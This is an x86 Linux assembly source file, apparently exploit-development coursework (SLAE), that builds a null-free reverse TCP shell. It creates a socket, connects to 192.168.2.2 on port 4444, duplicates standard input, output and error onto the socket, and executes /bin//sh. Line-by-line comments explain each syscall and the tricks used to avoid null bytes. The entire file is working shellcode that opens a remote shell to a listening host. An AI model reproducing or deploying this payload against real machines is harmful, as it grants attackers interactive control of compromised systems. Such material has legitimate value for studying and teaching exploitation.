;uthor: 	Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
; 		SLAE-461

global _start

section .text

_start:

;socket
   xor eax, eax   ; zero eax register to hold SYS_socketcall
   mov al, 0x66   ; al has enough space to hold the SYS_socketcall syscall id (102d=0x66) (see /usr/include/i386-linux-gnu/asm/unistd_32.h)
                  ;
   xor ebx, ebx   ; zero ebx register, ebx will hold the type of socketcall, in this case it will be the SYS_SOCKET
   push ebx       ; socket 3rd argument - See below at section "Comment 1" for explanation
   mov bl, 0x1    ; bl has enough space to hold SYS_SOCKET, id 1d = 0x1 (see /usr/include/linux/net.h)
                  ;
                  ; From C code: socket_descriptor=socket(AF_INET, SOCK_STREAM, 0);
                  ; From man pages: int socket(int domain, int type, int protocol)
                  ; From /usr/include/i386-linux-gnu/bits/socket.h we found that AF_INET"'"s id is 2
                  ; From /usr/include/i386-linux-gnu/bits/socket_type.h we found that SOCK_STREAM = 1
                  ; Thus:
                  ;                    socket(AF_INET,  SOCK_STREAM, 0     ); 
                  ;                       1  (2      ,      1      , 0     )
                  ; Comment 1:          EBX   1st_arg    2nd_arg  , 3rd_arg
                  ; Arguments must be pushed on the stack in reverse order, starting from the 0 (for the protocol parameter)
                  ; if we "push 0x0" we will end up with NULLs in the shellcode - we dont want this
                  ; we can xor a register but this will create extra instructions
                  ; we choose to "early" push ebx, before use it to "mov bl, 0x1", see earlier instructions
                  ;
   push 0x1       ; Push on the stack the SOCK_STREAM value (2nd argument) which should be 1
   push 0x2       ; Push on the stack the AF_INET (1st argument) which should be 2 
   mov ecx, esp   ; Save address of the parameters (AF_INET, SOCK_STREAM, 0) array, ... 
                  ; set ecx to point to the syscall SYS_SOCKET arguments which are currently at the top of the stack
   int 0x80       ; Invoke SYS_socketcall SYS_SOCKET
   
   mov esi, eax   ; We are storing the value of socket_descriptor into ESI as we will need it later in the SYS_CONNECT (see "push esi" in ;connect section below)


;connect
;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
   ;xor eax, eax  ; zero eax register to hold SYS_socketcall --- NO NEED TO NULL it again
   mov al, 0x66   ; as earlier, this time too, we are using al, this has enough space to hold the 
                  ; SYS_socketcall syscall id (102d=0x66) (see /usr/include/i386-linux-gnu/asm/unistd_32.h)
   ;xor ebx, ebx  ; zero ebx register, ebx will hold the type of socketcall, in this case it will be the SYS_CONNECT --- NO NEED TO NULL it again
   mov bl, 0x3    ; bl has enough space to hold SYS_SOCKET SYS_CONNECT id 3d = 0x3 (see /usr/include/linux/net.h)
                  ;
                  ; Parameters as per the struct sockaddr_in (push arguments in reverse order)
   push 0x0202A8C0; address.sin_addr.s_addr = inet_addr(CONNECT_TO_IP); - IP in hex reverse order, in our case 192.168.2.2 = 0xC0A80202
   push word 0x5c11; address.sin_port = htons(CONNECT_TO_PORT); - Port in byte reverse order, in our case 4444d = 0x115C 
   push word 0x2  ; address.sin_family = AF_INET; - as per /usr/include/i386-linux-gnu/bits/socket.h, AF_INET "'"s id is 2
   mov ecx, esp   ; save pointer of parameters (const struct sockaddr *addr) in ecx
                  ;
                  ; Now we are executing the actual connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
                  ; Values are being pushed in reverse order
   push 0x10      ; sizeof(address) "socklen_t addrlen" this is fixed 16 bytes
   push ecx       ; "const struct sockaddr *addr", push struct pointer
   push esi       ; "int sockfd" simply push sockfd
   mov ecx, esp   ; save pointer to all SYS_CONNECT parameters (!!!!)
   int 0x80       ;


;dup2
;int dup2(int oldfd, int newfd);
;dup2(socket_descriptor, _0_1_2 I/O file descriptors)
   mov ebx, esi      ; First backup ESI register as it contains the oldfd (int sockfd) from ;connect section
                     ; the socket_descriptor is needed in dup2 function, as it its 1st argument

   xor eax, eax      ; null EAX to store the syscall for dup2
   mov al, 0x3F      ; dup2 has syscall id 63d=3Fh
   xor ecx, ecx      ; dup2 2nd argument. For standard Input descriptor this should be 0
   int 0x80          ; Execute dup2 for Standard Input Descriptor

   xor eax, eax
   mov al, 0x3F      ; dup2 has syscall id 63d=3Fh
   mov cl, 0x1       ; dup2 2nd argument. For standard Output descriptor this should be 1 (earlier ECX was 0 - for Standard Input Descriptor)
   int 0x80          ; Execute dup2 for Standard Output Descriptor

   xor eax, eax
   mov al, 0x3F      ; dup2 has syscall id 63d=3Fh
   mov cl, 0x2       ; dup2 2nd argument. For standard Error descriptor this should be 2 (earlier ECX was 1 - for Standard Output Descriptor)

                     ; For dup2 we could also use a loop
   int 0x80          ; Execute dup2 for Standard Output Descriptor


;execve
;int execve(const char *filename, char *const argv[], char *const envp[]);
;    execve("/bin/sh",            NULL,               NULL);
;    EAX 11    EBX                  ECX               EDX              
;Building up th NULL terminated /bin//sh to be used in EXECVE, we are free to use other registers instead of EAX
   xor eax,eax       ; zeroing DWORD register so to build the null termination
   push eax          ; and pushing it (NULLs) on the stack
   push 0x68732f2f   ; 4 characters --- hs//
   push 0x6e69622f   ; 4 characters --- nib/
                     ; all these are being referenced by ESP as they are on the top of the stack
   mov ebx, esp      ; so we can load them in EBX
;Building up the THIRD (envp) argument of EXECVE
;char *const envp[] in our case should be null
   push eax          ; EAX is already null from the xor (see further up), we just need to push it on the stack
                     ; so it position on the top of the stack and be available to be allocated on another register
   mov edx, esp      ; char *const envp[] is the 3rd parameter so it has to be stored in EDX
                     ; essentially ESP holds the zero-ed values from the "push eax"
                     ; and we copy the top of the stack (zero-ed) into EDX
;Building up SECOND (argv) argument of EXECVE
; char *const argv[] should be "address_of_bin_bash, null (0x00000000)"
   push ebx          ; EBX is already on the stack and holds the address where ////bin/bash,0x0 begins
   mov ecx, esp      ; move the top of the stack to the ECX register
;Invoking EXECVE syscall number
   mov al, 11        ; we could also do: "mov al, 0xb"
   int 0x80          ; Invoke syscall
